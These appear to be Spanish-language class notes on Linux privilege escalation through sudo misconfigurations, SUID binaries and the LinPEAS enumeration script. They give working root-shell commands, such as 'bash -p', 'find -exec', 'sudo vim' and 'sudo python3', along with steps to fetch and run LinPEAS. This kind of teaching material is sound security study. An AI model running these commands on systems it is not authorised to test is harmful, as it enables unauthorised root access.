---
title: "Hacking Valentin Primera Clase"
date: 2026-01-26
tags:
  - ciberseguridad
  - herramientas
---
### **Escalada de Privilegios en Linux: SUID, Sudo y LinPEAS**  


> **Relacionado**: [[02-Ciencias-Computacion/Redes/Herramientas|Herramientas]]. [[02-Ciencias-Computacion/Sistemas-Operativos/UNIX/comandos/NMAP|NMAP]]. [[02-Ciencias-Computacion/Sistemas-Operativos/UNIX/comandos/chmod|chmod]]. [[01-Ciberseguridad/Forense/guia/Lectura-y-escritura-coordinada-entre-procesos-sin-kernel|Lectura y escritura coordinada entre procesos sin kernel]]. [[01-Ciberseguridad/Gestion-Seguridad/Tema3Gobierno_PoliticasSeguridad/Sistema-de-Gestion-de-la-Seguridad-de-la-Informacion|Sistema de Gestion de la Seguridad de la Informacion]].

La escalada de privilegios es una técnica utilizada para obtener permisos elevados en un sistema. En Linux, esto puede lograrse explotando configuraciones erróneas en **SUID**, **sudo**, archivos mal configurados y vulnerabilidades en el sistema.

---

## **1. Uso de `sudo -s` para Escalada de Privilegios**
El comando:
```bash
sudo -s
```
permite iniciar una **shell como root** si el usuario tiene permisos en el archivo `/etc/sudoers`. Para verificar si tienes acceso a `sudo`, usa:
```bash
sudo -l
```
Esto mostrará los comandos que el usuario puede ejecutar con privilegios elevados.

- Si encuentras **NOPASSWD**, significa que puedes ejecutar el comando sin contraseña.
- Si hay comandos específicos listados, verifica si alguno es vulnerable a manipulación.

---

## **2. Escalada de Privilegios con Archivos SUID**
En Linux, los archivos con el **bit SUID** permiten a cualquier usuario ejecutar el archivo con los permisos de su propietario (generalmente root).

Para encontrar archivos SUID en el sistema:
```bash
find / -perm -4000 -type f 2>/dev/null
```

Algunos archivos SUID comunes que pueden ser explotados:
- `/bin/bash`
- `/usr/bin/find`
- `/usr/bin/nmap`
- `/usr/bin/perl`
- `/usr/bin/python`

Si encuentras un binario SUID como `/bin/bash`, puedes escalar privilegios ejecutando:
```bash
/bin/bash -p
```

Si encuentras `find` con SUID:
```bash
find . -exec /bin/sh -p \;
```

---

## **3. Uso de LinPEAS para Detección de Vulnerabilidades**
**LinPEAS** (Linux Privilege Escalation Awesome Script) es una herramienta para detectar posibles puntos de escalada de privilegios en un sistema.

### **Descargar y ejecutar LinPEAS**
1. Descargar el script:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
2. Dar permisos de ejecución:
```bash
chmod +x linpeas.sh
```
3. Ejecutar el análisis:
```bash
./linpeas.sh
```

### **¿Qué analiza LinPEAS?**
- Archivos SUID y SGID que pueden ser explotados.
- Permisos en sudo mal configurados.
- Servicios vulnerables en ejecución.
- Contraseñas en archivos de configuración.
- Posibles backdoors o exploits conocidos en la versión del kernel.

---

## **4. Ejemplo de Escalada de Privilegios con `sudo -l`**
Si `sudo -l` muestra que puedes ejecutar `vim` con privilegios:
```bash
sudo vim -c '!sh'
```
Esto abrirá una shell con permisos elevados.

Otro caso común es cuando `sudo -l` muestra:
```bash
(root) NOPASSWD: /usr/bin/python3
```
Puedes escalar privilegios ejecutando:
```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

---

## **5. Conclusión**
- **Verifica `sudo -l`** para comandos con permisos elevados.  
- **Busca archivos con el bit SUID** para potencial explotación.  
- **Ejecuta LinPEAS** para un escaneo automático de posibles vectores de escalada.  
- **Prueba comandos específicos** si encuentras software mal configurado.  

 **La seguridad en Linux depende de la correcta configuración de permisos. Un simple error en sudo o SUID puede comprometer todo el sistema.** 